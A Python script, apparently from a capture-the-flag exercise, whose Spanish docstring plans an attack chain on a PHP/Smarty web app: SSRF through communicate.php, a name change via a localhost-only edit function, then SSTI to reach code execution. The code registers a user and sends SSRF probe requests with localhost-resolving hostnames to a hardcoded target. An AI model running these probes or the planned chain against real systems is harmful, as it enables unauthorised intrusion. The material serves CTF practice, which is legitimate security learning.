#!/usr/bin/env python3
"""
Análisis de vulnerabilidades encontradas:

1. PHP 7.0.33 - Versión antigua con vulnerabilidades conocidas
2. Apache 2.4.25 (Debian)
3. Smarty template engine
4. SQL Injection en procedimiento searchUser (concatenación directa)
5. SSRF en communicate.php con restricción motherland.com
6. Función edit solo desde localhost
7. Potencial SSTI en Smarty

FLUJO DE ATAQUE:
1. Registrar usuario (nombre sanitizado: solo alfanuméricos)
2. Explotar SSRF para llegar a localhost
3. Cambiar nombre con payload SSTI (edit no sanitiza)
4. SSTI en Smarty para RCE y leer flag

PROBLEMA CLAVE:
- communicate.php línea 17: curl_setopt($ch, CURLOPT_URL, $parsedUrl['host']);
- Solo usa el hostname, no la URL completa
- Necesito que motherland.com sea localhost o bypassear la validación

SOLUCIONES POSIBLES:
A. motherland.com resuelve a 127.0.0.1 en el servidor
B. Usar DNS rebinding o servicio como 127.0.0.1.nip.io.motherland.com (no funciona - regex)
C. Explotar parse_url con URL especial
D. El hostname sin http:// podría ser interpretado especialmente por curl
"""

import requests
import random
import string

TARGET = "http://94.237.49.23:45329"

def random_string(length=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

# Test 1: Ver si motherland.com resuelve a localhost EN EL SERVIDOR
print("[*] Test 1: Verificar si motherland.com resuelve a localhost en el servidor")
session = requests.Session()
username = random_string()
password = random_string()

# Register
data = {'name': 'test', 'username': username, 'password': password}
session.post(f"{TARGET}/register.php", data=data)
session.post(f"{TARGET}/login.php", data={'username': username, 'password': password})

# Try SSRF con motherland.com
data = {
    'url': 'http://motherland.com/',
    'data[test]': 'value'
}
resp = session.post(f"{TARGET}/communicate.php", data=data, timeout=10)

# Buscar indicios de que llegó a localhost
if "Yo," in resp.text or "Change your name" in resp.text:
    print("[+] SUCCESS! motherland.com parece resolver a localhost!")
    print(f"[+] Response length: {len(resp.text)}")
elif "cURL Error" in resp.text:
    import re
    match = re.search(r'cURL Error: ([^<]+)', resp.text)
    if match:
        error = match.group(1).strip()
        print(f"[-] cURL Error: {error}")
        if "timed out" in error.lower():
            print("[*] motherland.com no está accesible o no resuelve a localhost")
else:
    print(f"[-] Respuesta inesperada: {len(resp.text)} bytes")
    print(resp.text[:300])

# Test 2: Probar URL con protocolo file o gopher
print("\n[*] Test 2: Probar si curl acepta diferentes esquemas")
test_urls = [
    "http://localhost.motherland.com/",
    "http://127.0.0.1.motherland.com/",
]

for test_url in test_urls:
    print(f"\n[*] Probando: {test_url}")
    data = {
        'url': test_url,
        'data[test]': 'value'
    }
    try:
        resp = session.post(f"{TARGET}/communicate.php", data=data, timeout=10)
        if "cURL Error" in resp.text:
            import re
            match = re.search(r'cURL Error: ([^<]+)', resp.text)
            if match:
                error = match.group(1).strip()
                print(f"    Error: {error}")
    except Exception as e:
        print(f"    Exception: {e}")

print("\n[*] Necesito entender mejor cómo funciona el SSRF...")
